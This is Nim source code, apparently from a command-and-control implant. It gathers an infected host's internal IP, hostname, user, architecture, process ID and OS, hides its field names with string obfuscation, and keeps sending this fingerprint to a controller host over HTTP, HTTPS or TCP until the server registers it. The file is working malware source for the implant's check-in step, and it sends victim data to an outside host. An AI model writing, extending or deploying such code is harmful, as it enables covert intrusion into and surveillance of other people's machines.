import ../global
import ../general/metadata
import ../linapi/handlers
import ../network/http_core
import ../network/tcp_core
import ../network/relay_packet
import std/[json, random]

proc beaconDelaySec(): int =
  # Returns the beacon delay in seconds, or five when it is not positive
  if beaconDelay <= 0: 5 else: beaconDelay

var migrateHostTagDone = false

proc resolveHostTag*(): void =
  # Builds a random host tag once and stores it
  if migrateHostTagDone:
    return
  let n = if hostTag.len > 0: hostTag.len else: 6
  randomize()
  const tagChars = "0123456789abcdefghijklmnopqrstuvwxyz"
  var s = ""
  for _ in 0 ..< n:
    s.add tagChars[rand(0 .. tagChars.high)]
  hostTag = s
  migrateHostTagDone = true

proc buildFingerprintJson*(): JsonNode =
  # Builds the fingerprint object for this host
  let delaySec = beaconDelaySec()
  let internalIp = getInternalIp()
  %*{
    (obf("option")): obf("new"),
    (obf("tag")): hostTag,
    (obf("ip")): internalIp,
    (obf("hostname")): readHostname(),
    (obf("user")): getCurrentUser(),
    (obf("arch")): getMachineArch(),
    (obf("pid")): getCurrentProcessId(),
    (obf("os")): getOsName(),
    (obf("listener")): channel,
    (obf("delay")): delaySec,
    (obf("implant_config")): %*{
      (obf("channel")): channel,
      (obf("host")): host,
      (obf("port")): port,
      (obf("host_tag")): hostTag,
      (obf("delay")): delaySec,
    },
  }

proc isMissingHostResponse*(body: string): bool =
  # Checks that the body reports a missing host failure
  if body.len == 0:
    return false
  try:
    let data = parseJson(body)
    if data.kind != JObject or not data.hasKey(obf("status")) or not data.hasKey(obf("error")):
      return false
    data[obf("status")].getStr() == obf("failure") and data[obf("error")].getStr() == obf("Missing host")
  except JsonParsingError:
    false

proc fingerprintAccepted(body: string): bool =
  # Checks that the body says the host was included or already exists
  if body.len == 0:
    return false
  try:
    let data = parseJson(body)
    if not data.hasKey(obf("message")):
      return false
    let msg = data[obf("message")].getStr()
    msg == obf("host included") or msg == obf("host already exists")
  except JsonParsingError:
    false

proc transmitFingerprint(): void =
  # Sends the fingerprint once over HTTP or TCP
  var body = buildFingerprintJson()
  body[obf("metadata")] = createMetadata()
  if channel == obf("http") or channel == obf("https"):
    discard httpPost($(body))
  elif channel == obf("tcp"):
    var envelope = buildEnvelope(body)
    discard tcpExchange(envelope)

proc sendFingerprint*(): void =
  # Resolves the host tag and retries the fingerprint until it is accepted
  resolveHostTag()
  if channel == obf("http") or channel == obf("https"):
    while true:
      var body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      let resp = httpPost($(body))
      if resp.ok and resp.code == 200 and fingerprintAccepted(resp.body):
        break
      sleepMs(1000)
  elif channel == obf("tcp"):
    while true:
      var body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      var envelope = buildEnvelope(body)
      let resp = tcpExchange(envelope)
      if resp.ok and fingerprintAccepted(resp.body):
        break
      sleepMs(1000)
  else:
    transmitFingerprint()
